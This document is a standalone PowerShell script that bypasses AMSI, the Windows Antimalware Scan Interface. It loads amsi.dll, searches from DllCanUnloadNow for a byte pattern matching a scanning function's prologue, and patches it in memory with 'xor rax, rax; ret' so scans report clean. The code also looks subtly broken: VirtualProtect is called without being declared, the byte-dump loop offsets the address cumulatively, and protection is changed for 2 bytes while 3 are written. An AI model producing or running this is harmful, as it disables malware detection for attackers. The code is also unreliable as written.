$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress ([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

Add-Type $Kernel32
[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

[byte[]]$egg = [byte[]] (
    0x4C, 0x8B, 0xDC,         # mov     r11,rsp
    0x49, 0x89, 0x5B, 0x08,   # mov     qword ptr [r11+8],rbx
    0x49, 0x89, 0x6B, 0x10,   # mov     qword ptr [r11+10h],rbp
    0x49, 0x89, 0x73, 0x18,   # mov     qword ptr [r11+18h],rsi
    0x57,                     # push    rdi
    0x41, 0x56,               # push    r14
    0x41, 0x57,               # push    r15
    0x48, 0x83, 0xEC, 0x70    # sub     rsp,70h
)
[IntPtr]$targetedAddress = [Hunter]:: FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address $targetedAddress"

[string]$bytes = ""
[int]$i = 0
while ($i -lt $egg.Length) {
    [IntPtr]$targetedAddress = [IntPtr]::Add($targetedAddress, $i)
    $bytes += "0x" + [System.BitConverter]::ToString([System.Runtime.InteropServices.Marshal]::ReadByte($targetedAddress)) + " "
    $i++
}
Write-Host "[+] Bytes: $bytes"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
